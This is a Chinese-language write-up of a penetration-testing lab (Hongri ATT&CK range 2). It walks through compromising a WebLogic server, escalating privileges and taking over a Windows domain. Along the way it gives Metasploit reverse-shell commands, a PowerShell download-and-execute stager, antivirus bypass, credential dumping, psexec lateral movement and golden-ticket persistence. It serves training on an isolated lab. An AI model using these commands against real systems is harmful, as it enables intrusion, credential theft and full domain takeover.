# 红日ATT&CK系列靶场（二）

- 靶场地址:http://cloud-pentest.cn/index.html#
- 靶机下载地址：https://pan.baidu.com/s/1QlkyFALPCZADUQevFYf_2A?pwd=hqxi（提取码：hqxi）
- 虚拟机密码：1qaz@WSX
- 网络拓扑：

![截图](b5a4057bfa203d14f23e39c560667c32.png)

- 靶机信息概览：

|机器|IP|用户名|
|--|--|--|
|WEB.de1ay.com|192.168.111.80 / 10.10.10.80|DE1AY/mssql WEB/de1ay|
|PC.de1ay.com|192.168.111.201 / 10.10.10.201|DE1AY/mssql DE1AY/krbtgt PC/de1ay|
|DC.de1ay.com|10.10.10.10|DE1AY/de1ay|
|kali|192.168.111.168|root|

cao，配环境太不容易了。注意WEB需要手动开启7001服务，在 C:\Oracle\Middleware\user_projects\domains\base_domain\bin 下有一个 startWeblogic 的批处理，管理员身份运行它即可，管理员账号密码：Administrator/1qaz@WSX

![截图](382f445535c90bc33afcf585ffe9333d.png)

# 0x01 信息收集

对所在网段进行基础扫描

![截图](2c415412cf3ec04e5a5d82579ef76cf7.png)

![截图](677950ff5ed25423a0dcb731ea9bab80.png)

发现两个存活主机**192.168.111.80**和**192.168.111.201**

这里我们注意到192.168.111.80是存在两个http服务（80端口的IIS和7001端口的weblogic）

- 访问192.168.111.80:80是个空白页面
- 访问192.168.111.80:7001，404报错

![截图](ea5d82d6f9add5468148b061a06878c5.png)

## Nmap - 192.168.111.80

拿到环境后，首先进行端口探测，这里使用-sS参数，***由于防火墙的存在不能使用icmp包，所以使用syn包探测***

![截图](b098db8230be690c41a1b27458a12b96.png)

通过扫描端口，我们通过端口初步判断目标机存在的服务及可能存在的漏洞，如445端口开放就意味着存**smb服务**，存在smb服务就可能存在ms17-010/端口溢出漏洞。开放139端口，就存在**Samba服务**，就可能存在爆破/未授权访问/远程命令执行漏洞。开放1433端口，就存在**mssql服务**，可能存在爆破/注入/SA弱口令。开放3389端口，就存在**远程桌面**。开放7001端口就存在**weblogic**。

## 目录扫描 - 192.168.111.80

对这两个站点进行目录扫描

![截图](6093350b9b3e5938e7196cd2b7309ba6.png)

![截图](c6608236a501191d2f9cc9443103f400.png)

# 0x02 外围打点

访问暴露的192.168.111.80:7001的/console路由，结果都是跳转到http://192.168.111.80:7001/console/login/LoginForm.jsp

![截图](23379b219194feb2de8656796a0864a9.png)

尝试可能存在的弱口令之后依旧没有结果，尝试weblogic常见Nday利用。

工具地址：https://github.com/rabbitmask/WeblogicScan

```
python3 WeblogicScan.py -u 192.168.111.80 -p 7001
```

![截图](b9342b400423256cc5cc893329511515.png)

使用hyacinth-Java反序列化漏洞检测工具

工具地址：https://github.com/pureqh/Hyacinth

![截图](c8e262bffdab5a5fecc04d8de9ee727c.png)

看到存在多个java反序列化漏洞，尝试利用CVE-2017-10271

![截图](4eac85d100304ea2d2ea68a36ae2a93f.png)

使用冰蝎成功连接 

![截图](8d7dc08c65955a1ca62988ee90a7bd84.png)

![截图](fb8b665a391d8bc2eceedfd02cb7d49c.png)

冰蝎成功上线，取得webshell权限，但webshell可能随时被发现清除，需进一步权限维持。这里的思路是将shell派送给CS或者msf进行后渗透。

执行命令systeminfo发现该主机是win2008

![截图](38411f2095ae8256e9fababef539247a.png)

执行命令tasklist /v，查看Windows当前进程，发现存在360杀软(没有的话，自己开启360服务)

![截图](54c69b2c3c8160b84210c98c3c3aedf0.png)

主机上存在360，我们直接上传并执行msf生成的后门，基本是会被360查杀的

# 0x03 绕过杀软+权限维持与提升

我们这里其实可以不用折腾去做静态或动态免杀，可以用下列几种方法绕过360并上线：

## 3.1 绕过杀软、维持权限

### （1）方法一：使用冰蝎直接上线msf

kali上启动msf，并配置handler监听

```
msfconsole
use exploit/multi/handler
set payload java/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 2333
exploit
```

然后冰蝎去执行反弹shell的连接，msf即可上线成功

![截图](6f837875adeeb1706b98f5462e12e074.png)

![截图](c50b790f41de300b1a28f112d9bfa673.png)

### （2）方法二：使用msf中weblogic反序列化漏洞的exp去打

```
use exploit/multi/misc/weblogic_deserialize_asyncresponseservice
set rhosts 192.168.111.80
set lhost 192.168.111.128
set target 1                # 默认时unix，而我们目标是Windows
set payload windows/meterpreter/reverse_http # 或 windows/x64/meterpreter/reverse_http
exploit
```

这里要注意两点，一是该模块target默认为unix，我们需要将target改成windows；二是可能因为网络原因，session不能每次都成功创建，如果无法创建session就多run几次试试。

![截图](1795bf9904c30471a61a12ae502d59ce.png)

### （3）方法三：使用web投递powershell上线cs

注：该靶机不出网，所以这里无法使用vps上线CS。

首先创建beacon http监听器

![截图](db2a087acdd0913371be6a7df01282eb.png)

然后进行web投递

![截图](f199f8c16bc2a26c10e582ea1dc59ab7.png)

![截图](11e1927ad856811b0865d7fc48a3280b.png)

```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.111.128:80/a'))"
```

在冰蝎里执行生成的命令即可上线cs

![截图](cc216c659e23664b74efd2066e55fd45.png)

![截图](452cc5d12081e400f867f82b81d068b5.png)

## 3.2 权限提升

总之，上线成功后，尝试提权，通过msf直接提权不成功，由于是win2008，因此直接使用MS14-058提权，用的以下工具：`https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-058`可以。不过这里更快的方法是先派发给cs，在cs上直接就能提权成功了。

ms14-058 提到 system 权限

![截图](4952363c305fc56c8ce1ead32656434e.png)

![截图](3fdd5b5d00c38abedf21e82e43b0d106.png)

![截图](79ca11455532525ec2105778833e1e08.png)

然后我们再将cs提权后的shell派生到msf，用msf搜集内网信息比较方便。

首先msf创建一个handler监听器，监听本地8001端口，用的payload是windows/meterpreter/reverse_http

![截图](86b19478f143d9e607f027ea62f5e88f.png)

```
use exploit/multi/handler
set lhost 192.168.111.128
set lport 8001
set payload windows/meterpreter/reverse_http
run
```

然后cs中新建一个监听器，选择payload为foreign http

![截图](f59b2096517971c214810d6401821473.png)

在提权后的会话上新建一个会话

![截图](b6153ef0b078232a6447d19ea564424a.png)

成功在msf中上线

![截图](51b67c3f38838b06467b60d34ab1e593.png)

陷阱判断

```
dir或ls # 查看目录
run post/windows/gather/checkvm # 判断靶机是否进入蜜罐
run post/windows/gather/enum_applications # 列举安装程序
```

![截图](b711e2312cf3f8499bf46171aecae1c2.png)

打开3389端口

```
run post/windows/manage/enable_rdp
```

![截图](31f58881ca31ee6e64256ee148c374a5.png)

<br/>

# 0x04 内网信息收集

```
ipconfig /all   查看本机ip，所在域
route print     打印路由信息
net view        查看局域网内其他主机名
arp -a          查看arp缓存
net start       查看开启了哪些服务
net share       查看开启了哪些共享
net share ipc$  开启ipc共享
net share c$    开启c盘共享
net config Workstation   查看计算机名、全名、用户名、系统版本、工作站、域、登录域
net user                 查看本机用户列表
net time /domain        #查看时间服务器，判断主域，主域服务器都做时间服务器
net user /domain         查看域用户
net localgroup administrators   查看本地管理员组（通常会有域用户）
net view /domain         查看有几个域
net user 用户名 /domain   获取指定域用户的信息
net group /domain        查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）
net group 组名 /domain    查看域中某工作组
net group "domain admins" /domain  查看域管理员的名字
net group "domain computers" /domain  查看域中的其他主机名
net group "doamin controllers" /domain  查看域控制器（可能有多台）
```

查看网络配置信息：

```
shell ipconfig -all
```

发现存在域de1ay.com，内网网段是10.10.10.0/24，进一步根据DNS服务器可以判断域控是10.10.10.10

![截图](eea17091742f2e60549802fda302b0fc.png)

查看计算机名、全名、用户名、系统版本、工作站、域、登录域：

```
shell net config workstation
```

![截图](2354c34bb789303cca0b31d0fbffa588.png)

查询域内用户：

```
net user /domain
```

![截图](8f084aa242fc0b5de47e73d91620a529.png)

查询域控：

```
net group "domain controllers" /domain
```

![截图](2155b83e5a556bfb222ba2b662b2e713.png)

查看域中的其他主机名：

```
net group "domain computers" /domain
```

![截图](4f83408748816fe96cd54405adf9d8e6.png)

查看域管理员的名字：

```
net group "domain admins" /domain
```

![截图](572277cf11cc4054318cd6a9cc21aaa3.png)

ping一下DC和PC这两台主机，拿到其内网ip:

![截图](6c45ee0efcb556ba15e80b3bf554336c.png)

内网主机信息小结：

- 10.10.10.10 ，DC，域控
- 10.10.10.201，PC，域主机
- 110.10.10.80，WEB，域主机2

接下来直接cs里使用的portscan 10.10.10.0/24，探测内网存活主机+端口扫描。就不上传fscan或者nmap去扫了。

![截图](205629b513e049761bf0607be4429a92.png)

10.10.10.201（PC）因为可能开了防火墙或者有360等杀软，并没有探测成功。但是我们发现域控DC上开放了很多端口，开了445和139。

# 0x05 横向移动

在提权后，我们可以用**mimikatz dump目标机的凭证**，并进行内网横向移动**(PTH)**

## 横向DC - psexec 传递

横向移动跳转到DC（10.10.10.10），这里使用psexec，用之前**获取的域管密码**作为登录DC的口令，新建一个smb监听器，监听域内主机WEB（10.10.10.80） 作为跳板机传回来的session（上线）会话。

> psexec 是微软 pstools 工具包中最常用的一个工具，也是在内网渗透中的免杀渗透利器。psexec 能够在命令行下在对方没有开启 telnet 服务的时候返回一个半交互的命令行，像 telnet 客户端一样。原理是基于IPC共享，所以要目标打开 445 端口。另外在启动这个 psexec 建立连接之后对方机器上会被安装一个服务。

```
获取凭据后对目标网段进行端口存活探测，因为是 psexec 传递登录，这里仅需探测445端口
命令：portscan ip网段 端口 扫描协议（arp、icmp、none） 线程
例如：portscan 10.10.10.0/24 445 arp 200
```

![截图](bb885f6657ee731b8950fc4c17a5c19c.png)

可看到域控机器DC开放了445端口.

工具栏 View->Targets 查看端口探测后的存活主机

![截图](d5f0b6320de7cebeebfc3e73e69b21da.png)

SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效。

域控不出网无法形成反向shell，无法使用http监听器，所以创建一个SMB监听器。

![截图](04dfa5e1a9e851ebbb166b35206da341.png)

利用psexec横向移动

![截图](7f558622fbcd192578fb838e67828c88.png)

<br/>

![截图](f7ca298903ef98528cc1b53393ce579e.png)

![截图](772cd3a8ee6dab9c03f637cf78343b7c.png)

![截图](8d4f8970ac5dc03445a205fe9f5a19da.png)

DC成功上线，拿下域控

## 横向PC - psexec_psh

![截图](3d4311cbe6b9e8248dfd975cc8040693.png)

选择已经获得的凭据（明文、散列值、令牌都可以）、回连的listener、进行横向的session。

![截图](d06f0ad79d5d05d57fb709d0bc84527f.png)

![截图](1bd4bc88e4fc856ded5ea270b84a27a7.png)

到这里所有域内主机都已经拿下了，可以说已经是拿下这个域

# 0x06 权限维持

在域控获得KRBTGT账户NTLM密码哈希和SID

![截图](0e412bfceea5e4b01a778ccf7d2c0b0c.png)

![截图](b16984db133cb7d5666bee906dc6db26.png)

## 黄金票据利用

黄金票据是伪造票据授予票据（TGT），也被称为认证票据。TGT仅用于向域控制器上的密钥分配中心（KDC）证明用户已被其他域控制器认证。

### 黄金票据的条件要求：

- 域名称
- 域的SID值
- 域的KRBTGT账户NTLM密码哈希
- 伪造用户名

**黄金票据可以在拥有普通域用户权限和KRBTGT账号的哈希的情况下用来获取域管理员权限，上面已经获得域控的 system 权限了，还可以使用黄金票据做权限维持，当域控权限掉后，在通过域内其他任意机器伪造票据重新获取最高权限。**

WEB机 Administrator 权限机器->右键->Access->Golden Ticket

![截图](4022af44a2d15135ee24289cac186568.png)

![截图](b795d63e40b72c2c2d68c584c72eb158.png)

伪造成功。

伪造黄金票据之前：

![截图](2d0f9aec0ff32861f045205dbb9267f8.png)

伪造黄金票据之后：

![截图](99ac7dfd6487360b78f24f356aaf510e.png)